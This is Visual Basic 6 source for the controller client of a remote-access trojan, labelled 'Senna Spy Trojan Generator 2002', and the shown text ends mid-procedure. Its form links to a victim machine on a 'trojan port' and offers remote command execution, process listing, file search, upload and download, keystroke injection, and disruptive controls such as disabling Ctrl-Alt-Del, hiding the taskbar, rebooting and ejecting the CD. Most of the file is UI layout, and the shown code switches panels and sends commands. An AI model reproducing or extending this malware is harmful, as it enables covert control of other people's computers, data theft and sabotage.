VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form FormClient 
   AutoRedraw      =   -1  'True
   BorderStyle     =   1   'Fixed Single
   ClientHeight    =   6360
   ClientLeft      =   150
   ClientTop       =   330
   ClientWidth     =   8460
   LinkTopic       =   "Form1"
   ScaleHeight     =   6360
   ScaleWidth      =   8460
   StartUpPosition =      2 'CenterScreen
   Begin MSWinsockLib.Winsock WinsockTransfer 
      Left = 7860
      Top = 1530
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox TextIP 
      Height          =   285
      Left            =   600
      TabIndex        =   27
      Text            =   "127.0.0.1"
      Top             =   120
      Width           =   1395
   End
   Begin VB.CommandButton BotaoConectar 
      Height          =   495
      Left            =   4440
      TabIndex        =   26
      Top             =   120
      Width           =   1215
   End
   Begin VB.CommandButton BotaoSair 
      Height          =   495
      Left            =   7080
      TabIndex        =   25
      Top             =   120
      Width           =   1215
   End
   Begin VB.CommandButton BotaoDesconectar 
      Height          =   495
      Left            =   5760
      TabIndex        =   24
      Top             =   120
      Width           =   1215
   End
   Begin VB.TextBox TextPortaTrojan 
      Height          =   285
      Left            =   3240
      MaxLength       =   5
      TabIndex        =   23
      Text            =   "2002"
      Top             =   120
      Width           =   675
   End
   Begin MSWinsockLib.Winsock WinSockClient 
      Left            =   3960
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   0
   End
   Begin VB.Label LabelStatus 
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Status"
      Height          =   255
      Left            =   120
      TabIndex        =   111
      Top             =   6000
      Width           =   8295
   End
   Begin VB.Label LabelIP 
      Alignment       =   1  'Right Justify
      Caption         =   "IP:"
      Height          =   255
      Left            =   120
      TabIndex        =   29
      Top             =   120
      Width           =   375
   End
   Begin VB.Label LabelPorta 
      Alignment       =   1  'Right Justify
      Height          =   255
      Left            =   2160
      TabIndex        =   28
      Top             =   120
      Width           =   975
   End
   Begin VB.Frame FramePrincipal 
      Height          =   5295
      Left            =   120
      TabIndex        =   11
      Top             =   600
      Width           =   8295
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   0
         Left            =   120
         TabIndex        =   0
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   1
         Left            =   1440
         TabIndex        =   1
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   2
         Left            =   2760
         TabIndex        =   2
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   4
         Left            =   5640
         TabIndex        =   4
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   5
         Left            =   6960
         TabIndex        =   5
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   7
         Left            =   1440
         TabIndex        =   7
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   8
         Left            =   2760
         TabIndex        =   8
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   6
         Left            =   120
         TabIndex        =   6
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   10
         Left            =   5640
         TabIndex        =   10
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton BotaoFrame 
         Height          =   495
         Index           =   9
         Left            =   4320
         TabIndex        =   9
         Top             =   720
         Width           =   1215
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   0
         Left            =   120
         TabIndex        =   12
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoDiretorio 
            Height          =   375
            Left            =   120
            TabIndex        =   31
            Top             =   3360
            Width           =   7815
         End
         Begin VB.TextBox TextInformacoesComputador 
            ForeColor       =   &H00000000&
            Height          =   2955
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   30
            Top             =   240
            Width           =   7815
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   1
         Left            =   120
         TabIndex        =   21
         Top             =   1320
         Width           =   8055
         Begin VB.TextBox TextMensagemEnviada 
            BackColor       =   &H00FFFFFF&
            Height          =   1455
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertical
            TabIndex        =   34
            Top             =   480
            Width           =   6615
         End
         Begin VB.TextBox TextMensagemRecebida 
            BackColor       =   &H00FFFFFF&
            Height          =   1455
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertical
            TabIndex        =   33
            Top             =   2280
            Width           =   6615
         End
         Begin VB.CommandButton BotaoEnviarMensagem 
            Height          =   375
            Left            =   6840
            TabIndex        =   32
            Top             =   480
            Width           =   1095
         End
         Begin VB.Label LabelMensagemEnviada 
            AutoSize        =   -1  'True
            Height          =   195
            Left            =   120
            TabIndex        =   36
            Top             =   240
            Width           =   1455
         End
         Begin VB.Label LabelMensagemRecebida 
            AutoSize        =   -1  'True
            Height          =   195
            Left            =   120
            TabIndex        =   35
            Top             =   2040
            Width           =   1560
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   4
         Left            =   120
         TabIndex        =   19
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoWindows 
            Height          =   375
            Left            =   6840
            TabIndex        =   80
            Top             =   3120
            Width           =   1095
         End
         Begin VB.TextBox TextComandoWindows 
            Height          =   285
            Left            =   120
            TabIndex        =   79
            Top             =   3120
            Width           =   6615
         End
         Begin VB.CheckBox CheckWindows 
            Height          =   255
            Left            =   120
            TabIndex        =   78
            Top             =   3480
            Width           =   4095
         End
         Begin VB.TextBox TextResultadoComando 
            BeginProperty Font 
               Name            =   "Courier New"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1860
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   77
            Top             =   960
            Width           =   7815
         End
         Begin VB.CommandButton BotaoComando 
            Height          =   375
            Left            =   6840
            TabIndex        =   75
            Top             =   240
            Width           =   1095
         End
         Begin VB.TextBox TextComando 
            Height          =   285
            Left            =   1440
            TabIndex        =   74
            Top             =   240
            Width           =   5295
         End
         Begin VB.Label LabelWindows 
            Height          =   255
            Left            =   120
            TabIndex        =   110
            Top             =   2880
            Width           =   7815
         End
         Begin VB.Label LabelResultadoComando 
            Alignment       =   2  'Center
            Height          =   255
            Left            =   120
            TabIndex        =   109
            Top             =   720
            Width           =   7815
         End
         Begin VB.Label LabelDOS 
            Alignment       =   1  'Right Justify
            Height          =   255
            Left            =   120
            TabIndex        =   76
            Top             =   270
            Width           =   1215
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   10
         Left            =   120
         TabIndex        =   13
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoMouseNormal
            Height = 495
            Left = 1320
            TabIndex = 125
            Top = 720
            Width = 1095
         End
         Begin VB.CommandButton BotaoMouseTroca
            Height = 495
            Left = 1320
            TabIndex = 126
            Top = 240
            Width = 1095
         End
         Begin VB.CommandButton BotaoCtrlAltDelEnable
            Height = 495
            Left = 1320
            TabIndex = 124
            Top = 1200
            Width = 1095
         End
         Begin VB.CommandButton BotaoCtrlAltDelDisable
            Height = 495
            Left = 1320
            TabIndex = 123
            Top = 1680
            Width = 1095
         End
         Begin VB.ListBox ListResolucao 
            Height          =   2205
            Left            =   4200
            TabIndex        =   88
            Top             =   240
            Width           =   3735
         End
         Begin VB.CommandButton BotaoResolucao 
            Height          =   495
            Left            =   4200
            TabIndex        =   87
            Top             =   2640
            Width           =   3735
         End
         Begin VB.CommandButton BotaoShowTaskbar 
            Height          =   495
            Left            =   120
            TabIndex        =   86
            Top             =   2640
            Width           =   1095
         End
         Begin VB.CommandButton BotaoHideTaskbar 
            Height          =   495
            Left            =   120
            TabIndex        =   85
            Top             =   2160
            Width           =   1095
         End
         Begin VB.CommandButton BotaoDerrubar 
            Height          =   495
            Left            =   120
            TabIndex        =   84
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoResetar 
            Height          =   495
            Left            =   120
            TabIndex        =   83
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoAbrirCD 
            Height          =   495
            Left            =   120
            TabIndex        =   82
            Top             =   720
            Width           =   1095
         End
         Begin VB.CommandButton BotaoFecharCD 
            Height          =   495
            Left            =   120
            TabIndex        =   81
            Top             =   240
            Width           =   1095
         End
         Begin VB.CommandButton BotaoDoubleClickOn 
            Height          =   495
            Left            =   2520
            TabIndex        =   82
            Top             =   240
            Width           =   1095
         End
         Begin VB.CommandButton BotaoDoubleClickOff 
            Height          =   495
            Left            =   2520
            TabIndex        =   81
            Top             =   720
            Width           =   1095
         End
         Begin VB.CommandButton BotaoClipboardOn 
            Height          =   495
            Left            =   1320
            TabIndex        =   82
            Top             =   2160
            Width           =   1095
         End
         Begin VB.CommandButton BotaoClipboardOff 
            Height          =   495
            Left            =   1320
            TabIndex        =   81
            Top             =   2640
            Width           =   1095
         End
         Begin VB.CommandButton BotaoRemoveServer 
            Height          =   495
            Left            =   2520
            TabIndex        =   85
            Top             =   1200
            Width           =   1095
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   5
         Left            =   120
         TabIndex        =   18
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoProcessos 
            Default         =   -1  'True
            Height          =   375
            Left            =   6840
            TabIndex        =   95
            Top             =   3360
            Width           =   1095
         End
         Begin VB.ListBox ListProcessos 
            BackColor       =   &H00FFFFFF&
            BeginProperty Font 
               Name            =   "Courier New"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   2370
            Left            =   120
            TabIndex        =   94
            Top             =   840
            Width           =   7815
         End
         Begin VB.Label LabelAvisoProcessos 
            Alignment       =   2  'Center
            BorderStyle     =   1  'Fixed Single
            Height          =   255
            Left            =   120
            TabIndex        =   93
            Top             =   240
            Width           =   7815
         End
         Begin VB.Label LabelProcessos 
            Height          =   255
            Left            =   120
            TabIndex        =   92
            Top             =   600
            Width           =   7815
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   7
         Left            =   120
         TabIndex        =   16
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoPesquisaBitmap 
            Height          =   375
            Left            =   3240
            TabIndex        =   99
            Top             =   3360
            Width           =   2295
         End
         Begin VB.CommandButton BotaoApagarBitmap 
            Height          =   375
            Left            =   5640
            TabIndex        =   98
            Top             =   3360
            Width           =   2295
         End
         Begin VB.ListBox ListBitmap 
            Height          =   2595
            Left            =   120
            TabIndex        =   97
            Top             =   600
            Width           =   7815
         End
         Begin VB.Label LabelPapelParede 
            Alignment       =   2  'Center
            BorderStyle     =   1  'Fixed Single
            Height          =   255
            Left            =   120
            TabIndex        =   96
            Top             =   240
            Width           =   7815
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   6
         Left            =   120
         TabIndex        =   17
         Top             =   1320
         Width           =   8055
         Begin VB.ListBox ListPesquisarArquivos 
            Height          =   2790
            Left            =   120
            TabIndex        =   103
            Top             =   960
            Width           =   7815
         End
         Begin VB.CommandButton BotaoPesquisarArquivos 
            Height          =   375
            Left            =   6840
            TabIndex        =   101
            Top             =   480
            Width           =   1095
         End
         Begin VB.TextBox TextPesquisarArquivos 
            Height          =   375
            Left            =   120
            TabIndex        =   100
            Text            =   "*.EXE"
            Top             =   480
            Width           =   6615
         End
         Begin VB.Label LabelPesquisaArquivos 
            Height          =   255
            Left            =   120
            TabIndex        =   102
            Top             =   240
            Width           =   7815
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   8
         Left            =   120
         TabIndex        =   15
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoMultimidiaWAV 
            Height          =   375
            Left            =   5640
            TabIndex        =   106
            Top             =   3360
            Width           =   2295
         End
         Begin VB.ListBox ListMultimidia 
            Height          =   2595
            Left            =   120
            TabIndex        =   105
            Top             =   600
            Width           =   7815
         End
         Begin VB.CommandButton BotaoMultimidiaAVI 
            Height          =   375
            Left            =   3240
            TabIndex        =   104
            Top             =   3360
            Width           =   2295
         End
         Begin VB.Label LabelMultimidia 
            Alignment       =   2  'Center
            BorderStyle     =   1  'Fixed Single
            Height          =   255
            Left            =   120
            TabIndex        =   107
            Top             =   240
            Width           =   7815
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   2
         Left            =   120
         TabIndex        =   22
         Top             =   1320
         Width           =   8055
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FF80FF&
            Caption         =   "NUM Lock"
            Height          =   375
            Index           =   5
            Left            =   5640
            Style           =   1  'Graphical
            TabIndex        =   73
            Tag             =   "{NUMLOCK}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FF80FF&
            Caption         =   "Scroll Lock"
            Height          =   375
            Index           =   33
            Left            =   5640
            Style           =   1  'Graphical
            TabIndex        =   72
            Tag             =   "{SCROLLLOCK}"
            Top             =   2520
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FF80FF&
            Caption         =   "Break"
            Height          =   375
            Index           =   16
            Left            =   5640
            Style           =   1  'Graphical
            TabIndex        =   71
            Tag             =   "{BREAK}"
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000080FF&
            Caption         =   "BackSpace"
            Height          =   375
            Index           =   6
            Left            =   6840
            Style           =   1  'Graphical
            TabIndex        =   70
            Tag             =   "{BS}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C0C0&
            Caption         =   "Enter"
            Height          =   1215
            Index           =   17
            Left            =   6840
            Style           =   1  'Graphical
            TabIndex        =   69
            Tag             =   "{ENTER}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C000&
            Caption         =   "Shift"
            Height          =   375
            Index           =   28
            Left            =   6840
            Style           =   1  'Graphical
            TabIndex        =   68
            Tag             =   "+"
            Top             =   3000
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C000&
            Caption         =   "ALT"
            Height          =   375
            Index           =   31
            Left            =   5640
            Style           =   1  'Graphical
            TabIndex        =   67
            Tag             =   "%"
            Top             =   3360
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0FFC0&
            Caption         =   "CTRL"
            Height          =   375
            Index           =   32
            Left            =   6840
            Style           =   1  'Graphical
            TabIndex        =   66
            Tag             =   "^"
            Top             =   3360
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFF80&
            Caption         =   "Left <---"
            Height          =   375
            Index           =   23
            Left            =   2040
            Style           =   1  'Graphical
            TabIndex        =   65
            Tag             =   "{LEFT}"
            Top             =   2520
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFF80&
            Caption         =   "Up"
            Height          =   375
            Index           =   24
            Left            =   3240
            Style           =   1  'Graphical
            TabIndex        =   64
            Tag             =   "{UP}"
            Top             =   2520
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFF80&
            Caption         =   "Down"
            Height          =   375
            Index           =   25
            Left            =   3240
            Style           =   1  'Graphical
            TabIndex        =   63
            Tag             =   "{DOWN}"
            Top             =   2880
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFFF80&
            Caption         =   "Right --->"
            Height          =   375
            Index           =   26
            Left            =   4440
            Style           =   1  'Graphical
            TabIndex        =   62
            Tag             =   "{RIGHT}"
            Top             =   2520
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "Insert"
            Height          =   375
            Index           =   13
            Left            =   2040
            Style           =   1  'Graphical
            TabIndex        =   61
            Tag             =   "{INS}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "Delete"
            Height          =   375
            Index           =   19
            Left            =   2040
            Style           =   1  'Graphical
            TabIndex        =   60
            Tag             =   "{DEL}"
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "Home"
            Height          =   375
            Index           =   14
            Left            =   3240
            Style           =   1  'Graphical
            TabIndex        =   59
            Tag             =   "{HOME}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "End"
            Height          =   375
            Index           =   20
            Left            =   3240
            Style           =   1  'Graphical
            TabIndex        =   58
            Tag             =   "{END}"
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "Page Up"
            Height          =   375
            Index           =   15
            Left            =   4440
            Style           =   1  'Graphical
            TabIndex        =   57
            Tag             =   "{PGUP}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000FFFF&
            Caption         =   "Page Down"
            Height          =   375
            Index           =   21
            Left            =   4440
            Style           =   1  'Graphical
            TabIndex        =   56
            Tag             =   "{PGDN}"
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C000&
            Caption         =   "ESC"
            Height          =   735
            Index           =   12
            Left            =   120
            Style           =   1  'Graphical
            TabIndex        =   55
            Tag             =   "{ESC}"
            Top             =   840
            Width           =   615
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FF80FF&
            Caption         =   "CAPS Lock"
            Height          =   375
            Index           =   22
            Left            =   120
            Style           =   1  'Graphical
            TabIndex        =   54
            Tag             =   "{CAPSLOCK}"
            Top             =   2160
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00FFC0C0&
            Caption         =   "TAB"
            Height          =   375
            Index           =   18
            Left            =   120
            Style           =   1  'Graphical
            TabIndex        =   53
            Tag             =   "{TAB}"
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C000&
            Caption         =   "Shift"
            Height          =   375
            Index           =   27
            Left            =   120
            Style           =   1  'Graphical
            TabIndex        =   52
            Tag             =   "+"
            Top             =   3000
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H0000C000&
            Caption         =   "ALT"
            Height          =   375
            Index           =   30
            Left            =   1320
            Style           =   1  'Graphical
            TabIndex        =   51
            Tag             =   "%"
            Top             =   3360
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0FFC0&
            Caption         =   "CTRL"
            Height          =   375
            Index           =   29
            Left            =   120
            Style           =   1  'Graphical
            TabIndex        =   50
            Tag             =   "^"
            Top             =   3360
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F1"
            Height          =   375
            Index           =   0
            Left            =   840
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   49
            Tag             =   "{F1}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F2"
            Height          =   375
            Index           =   1
            Left            =   2040
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   48
            Tag             =   "{F2}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F3"
            Height          =   375
            Index           =   2
            Left            =   3240
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   47
            Tag             =   "{F3}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F4"
            Height          =   375
            Index           =   3
            Left            =   4440
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   46
            Tag             =   "{F4}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F5"
            Height          =   375
            Index           =   4
            Left            =   5640
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   45
            Tag             =   "{F5}"
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F6"
            Height          =   375
            Index           =   7
            Left            =   840
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   44
            Tag             =   "{F6}"
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F7"
            Height          =   375
            Index           =   8
            Left            =   2040
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   43
            Tag             =   "{F7}"
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F8"
            Height          =   375
            Index           =   9
            Left            =   3240
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   42
            Tag             =   "{F8}"
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F9"
            Height          =   375
            Index           =   10
            Left            =   4440
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   41
            Tag             =   "{F9}"
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoTeclas 
            Appearance      =   0  'Flat
            BackColor       =   &H000000FF&
            Caption         =   "F10"
            Height          =   375
            Index           =   11
            Left            =   5640
            MaskColor       =   &H000000FF&
            Style           =   1  'Graphical
            TabIndex        =   40
            Tag             =   "{F10}"
            Top             =   1200
            Width           =   1095
         End
         Begin VB.CommandButton BotaoLimpaTeclas 
            Height          =   375
            Left            =   6840
            TabIndex        =   39
            Top             =   360
            Width           =   1095
         End
         Begin VB.CommandButton BotaoEnviaTeclas 
            Height          =   375
            Left            =   5640
            TabIndex        =   38
            Top             =   360
            Width           =   1095
         End
         Begin VB.TextBox TextEnviarTeclas 
            Height          =   285
            Left            =   120
            TabIndex        =   37
            Top             =   480
            Width           =   5415
         End
         Begin VB.Label LabelEnviarTeclas 
            Alignment       =   0  'Left Justify
            Height          =   255
            Left            =   120
            TabIndex        =   108
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frames 
         Height          =   3855
         Index           =   9
         Left            =   120
         TabIndex        =   14
         Top             =   1320
         Width           =   8055
         Begin VB.DriveListBox DriveLocal
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 330
            Left = 4680
            TabIndex = 122
            Top = 480
            Width = 3255
         End
         Begin VB.ListBox ListUploadDownload
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 900
            Left = 120
            TabIndex = 121
            Top = 2880
            Width = 7815
         End
         Begin VB.FileListBox FileLocal
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 930
            Hidden = -1             'True
            Left = 4680
            MultiSelect = 2        'Extended
            System = -1             'True
            TabIndex = 120
            Top = 1920
            Width = 3255
         End
         Begin VB.CommandButton BotaoDownloadFiles
            Caption = "--------->"
            Height = 375
            Left = 3480
            TabIndex = 119
            Top = 2400
            Width = 1095
         End
         Begin VB.CommandButton BotaoUploadFiles
            Caption = "<---------"
            Height = 375
            Left = 3480
            TabIndex = 118
            Top = 1920
            Width = 1095
         End
         Begin VB.DirListBox DirLocal
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 1050
            Left = 4680
            TabIndex = 117
            Top = 840
            Width = 3255
         End
         Begin VB.ListBox ListRemoteDrive
            Height = 645
            Left = 120
            TabIndex = 27
            Top = 480
            Width = 3255
         End
         Begin VB.ListBox ListRemoteArquivos
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 900
            Left = 120
            MultiSelect = 2        'Extended
            TabIndex = 114
            Top = 1920
            Width = 3255
         End
         Begin VB.ListBox ListRemoteDiretorios
            BeginProperty Font
               Name = "Courier New"
               Size = 8.25
               Charset = 0
               Weight = 400
               Underline = 0           'False
               Italic = 0              'False
               Strikethrough = 0       'False
            EndProperty
            Height = 690
            Left = 120
            TabIndex = 113
            Top = 1200
            Width = 3255
         End
         Begin VB.Label LabelLocal
            Caption = "Local Computer"
            Height = 255
            Left = 5400
            TabIndex = 115
            Top = 240
            Width = 1455
         End
         Begin VB.Label LabelRemote
            Caption = "Remote Computer"
            Height = 255
            Left = 960
            TabIndex = 112
            Top = 240
            Width = 1455
         End
      End
   End
End
Attribute VB_Name = "FormClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Const MAX_FRAME = 10

Dim cRemoteDirectory As String
Dim cTituloCurto As String
Dim nTrojanPort As Long
Dim nFrame As Integer


Dim lAudio As Boolean

Private Sub BotaoFrame_Click(Index As Integer)
   On Error Resume Next

   If Index = 9 Then
      If ListRemoteDrive.ListCount = 0 Then
         EnviaString COMMAND_CHANGE_DRIVE
      End If
   Endif

   Frames_Click Index
End Sub

Private Sub BotaoFrame_GotFocus(Index As Integer)
   BotaoFrame_Click Index
End Sub

Private Sub Form_Load()
   On Error Resume Next

   BotaoDesconectar.Enabled = False

   For nFrame = 0 To MAX_FRAME
       Frames(nFrame).Visible = False
       Frames(nFrame).Tag = False
   Next

   nFrame = 0

   Frames(0).Tag = True
   Frames_Click 0

   FORMClient.Caption = "EMM Client 2002"
   cTituloCurto = "SkBeta - ICQ UIN: 51964739"

   LimparControles
End Sub

Private Sub Frames_Click(Index As Integer)
   On Error Resume Next

   Dim nTopOld As Long
   Dim nLeftOld As Long
   Dim nWidthOld As Long
   Dim nHeightOld As Long

   If Index <> nFrame Or Frames(Index).Tag = True Then
      nTopOld = Frames(nFrame).Top
      nLeftOld = Frames(nFrame).Left
      nWidthOld = Frames(nFrame).Width
      nHeightOld = Frames(nFrame).Height

      Frames(nFrame).Visible = False
      Frames(nFrame).Tag = False

      Frames(Index).Visible = True
      Frames(Index).Caption = BotaoFrame(Index).Caption

      Frames(nFrame).Top = Frames(Index).Top
      Frames(nFrame).Left = Frames(Index).Left
      Frames(nFrame).Width = Frames(Index).Width
      Frames(nFrame).Height = Frames(Index).Height

      nFrame = Index

      Frames(nFrame).Top = nTopOld
      Frames(nFrame).Left = nLeftOld
      Frames(nFrame).Width = nWidthOld
      Frames(nFrame).Height = nHeightOld
   End If
End Sub

Private Sub BotaoApagarBitmap_Click()
   EnviaString COMMAND_CHANGE_WALLPAPER
End Sub

Private Sub BotaoPesquisaBitmap_Click()
   ListBitmap.Clear

   EnviaString COMMAND_FIND_BITMAP + "*.BMP"
End Sub

Private Sub WinsockTransfer_DataArrival(ByVal bytesTotal As Long)

   On error Resume Next

   Dim cRecebido As String
   Dim cString As String

   Dim cStringNew As String

   WinsockTransfer.GetData cRecebido

   If cRecebido <> Empty Then
      Call VerificaDados(cRecebido)

      DoEvents
   End if
End Sub

Private Sub WinsockTransfer_SendComplete()
   bDadosEnviados = True
End Sub

Private Sub WinsockTransfer_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
